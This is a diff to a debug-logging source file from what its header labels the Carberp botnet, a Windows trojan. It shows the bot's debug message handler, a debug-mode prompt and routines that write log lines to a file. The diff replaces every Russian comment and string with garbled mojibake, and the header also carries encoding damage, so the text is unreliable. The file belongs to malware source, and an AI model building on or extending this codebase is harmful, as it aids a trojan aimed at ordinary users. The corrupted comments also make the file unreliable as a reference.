@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 #include <windows.h>
 
@@ -15,7 +26,7 @@ DWORD HandlerPID = 0;
 LPVOID DebugMsgHandler = NULL;
 TDebugMessageHandlerMethod DebugMsgHandlerHandlerMethod;
 
-// Установить обработчик отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 void SetDebugMessageHandler(LPVOID Handler, TDebugMessageHandlerMethod Method)
 {
 	IsNewProcess(HandlerPID);
@@ -25,7 +36,7 @@ void SetDebugMessageHandler(LPVOID Handler, TDebugMessageHandlerMethod Method)
 
 #ifdef DEBUGBOT
 
-PCHAR StartDebugMSG = "Бот запущен в отладочном режиме! Продолжить?";
+PCHAR StartDebugMSG = "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ! пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ?";
 
 bool StartInDebugingMode(bool ShMSG)
 {
@@ -43,7 +54,7 @@ bool StartInDebugingMode(bool ShMSG)
 
 /* void DebugMessage(PCHAR Msg)
 {
-	// Вывести сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pMessageBoxA(0, Msg, NULL, MB_OK);
 }
 */
@@ -53,8 +64,8 @@ bool StartInDebugingMode(bool ShMSG)
 
 	HANDLE OpenDebugFile(PCHAR FileName)
 	{
-		// Функция открывает файл для записи и смещает указатель в
-		// конец файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (STR::IsEmpty(FileName))
 			return NULL;
 
@@ -86,7 +97,7 @@ bool StartInDebugingMode(bool ShMSG)
 
 	void OutputDebugStringInFileA(PCHAR Section, PCHAR Line)
 	{
-		// Функция выводит отладочную строку в файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 		string FileName = BotDebugPath;
 
 		#ifdef SPLIT_LOG_ON_MODULES
@@ -125,7 +136,7 @@ bool StartInDebugingMode(bool ShMSG)
 
 void Debug::MessageEx(PCHAR Module, DWORD Line, PCHAR Section, PCHAR ExtData, PCHAR Str, ...)
 {
-	// Вызвать отладочное сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #ifdef DebugUtils
 	PCHAR FullLine = STR::Alloc(StrCalcLength(Str) + 4096);
 
@@ -159,14 +170,14 @@ void Debug::MessageEx(PCHAR Module, DWORD Line, PCHAR Section, PCHAR ExtData, PC
 	char SectionLine[] = {' ', '[', ' ', '%', 's', ' ', ']',  0};
     char MsgLine[]     = {' ', ':', ' ', ' ', '%', 's',  0};
 
-	// Определяем маску строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR NL = (Line != 0)? NomberLine : StrFmt;
 	PCHAR SL = (!STR::IsEmpty(Section))? SectionLine : StrFmt;
 
 	PCHAR SourceLine = STR::New(5, StrFmt, NL, SL, MsgLine, "\r\n");
 	// "%s(%d) [ %s ] : %s"
 
-	// Собираем строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR LineStr = (Line != 0) ? StrLongToString(Line) : NULL;
 
 	_wsprintfA(ExtLine, SourceLine, Module, LineStr, Section, FullLine);
